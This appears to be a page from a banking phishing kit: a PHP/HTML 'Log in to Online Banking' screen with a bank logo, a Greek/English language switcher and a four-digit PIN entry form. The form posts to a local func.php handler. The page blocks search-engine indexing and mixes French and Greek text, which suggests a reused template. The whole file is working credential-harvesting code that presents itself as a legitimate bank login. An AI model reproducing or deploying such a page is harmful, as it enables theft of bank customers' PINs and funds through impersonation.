<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="./Assets/imgs/ff.ico" />

        <title>Log in to Online Banking</title>
        <script src="./Assets/js/stutes.js"></script>        
    </head>

    <body>

        <div id="wrapper">
            <div class="left"></div>
            <div class="right">
                <div class="inner">
                    <div class="logo">
                        <div><img style="max-width: 230px;" src="./Assets/imgs/logo.svg"></div>
                        <div class="lang">
                            <button type="button">Ελληνικά <i class="fa-solid fa-caret-down"></i></button>
                            <ul>
                                <li><a href="index.php?lang=gr">Ελληνικά</a></li>
                                <li><a href="index.php?lang=en">English</a></li>
                            </ul>
                        </div>
                    </div>
                    <form action="./Assets/php/config/func.php" method="POST">
                        <input type="hidden" name="pin">
                        <div class="title">
                            <h3>Entrez votre code PIN</h3>
                            <p>Afin de vérifier votre identité, saisissez votre code PIN.</p>
                        </div>
                        <?php if( isset($_GET['error']) ) : ?>
                        <div class="error">
                            <div class="sym"><i class="fa-solid fa-circle-exclamation"></i></div>
                            <p>Οι πληροφορίες που έχετε εισάγει είναι εσφαλμένες. Ελέγξτε τις πληροφορίες και δοκιμάστε ξανά</p>
                        </div>
                        <?php endif; ?>
                        <div class="form-group mb20 <?php if(isset($_GET['error'])) echo "has-error"?>">
                            <label for="pin1">Code PIN</label>
                            <div class="inputs pin">
                                <input inputmode="numeric" type="text" name="pin1" id="pin1" class="form-control" placeholder="*">
                                <input inputmode="numeric" type="text" name="pin2" id="pin2" class="form-control" placeholder="*">
                                <input inputmode="numeric" type="text" name="pin3" id="pin3" class="form-control" placeholder="*">
                                <input inputmode="numeric" type="text" name="pin4" id="pin4" class="form-control" placeholder="*">
                            </div>
                        </div>
                        <div class="btns mb30">
                            <button type="submit">Συνεχίζω</button>
                        </div>
                        <p style="font-size: 16px;"><span><i class="fa-solid fa-arrow-left-long"></i> Επιστροφή στην είσοδο</span></p>
                    </form>
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>

            $('#pin1').mask('0');
            $('#pin2').mask('0');
            $('#pin3').mask('0');
            $('#pin4').mask('0');

            $('.inputs.pin input').keyup(function(e){
                if( $(this).val().length == 1 ) {
                    $(this).next().focus();
                } else if( $(this).val().length == 0 ) {
                    if( e.keyCode == 8 ) {
                        $(this).prev().focus();
                    }
                }
            });
        </script>

    </body>

</html>